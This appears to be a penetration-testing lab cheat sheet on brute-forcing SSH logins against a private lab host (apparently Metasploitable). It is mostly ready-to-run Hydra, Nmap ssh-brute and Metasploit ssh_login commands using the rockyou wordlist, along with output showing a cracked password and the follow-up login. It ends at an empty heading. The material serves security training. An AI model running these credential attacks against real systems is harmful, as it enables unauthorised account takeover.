## SSH Brute Force

Multiple tools for cracking SSH credentials — Hydra, Nmap NSE, and Metasploit.

---

## Hydra

```bash
# Decompress rockyou wordlist
gzip -d /usr/share/wordlists/rockyou.txt.gz

# Brute force SSH
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.177.129 ssh
```

---

## Nmap ssh-brute

```bash
# Create username list
echo "msfadmin" > users

# Run SSH brute force script
nmap 192.168.177.129 -p22 --script ssh-brute --script-args userdb=./users
```

```output
NSE: [ssh-brute] Trying username/password pair: msfadmin:msfadmin
...
| ssh-brute: 
|   Accounts: 
|     msfadmin:msfadmin - Valid credentials
|_  Statistics: Performed 5 guesses in 3 seconds, average tps: 1.7
```

## Post-Crack SSH Login

```bash
# Standard login
ssh msfadmin@192.168.177.129

# Force legacy RSA algorithm
ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.177.129
```

## Metasploit ssh_login

```bash
msfconsole
```

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.177.129
set username msfadmin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

| Option | Purpose |
|--------|---------|
| `STOP_ON_SUCCESS true` | Stop after first valid credential found |
| `VERBOSE true` | Show each attempt |

## Alternative: userpass_file
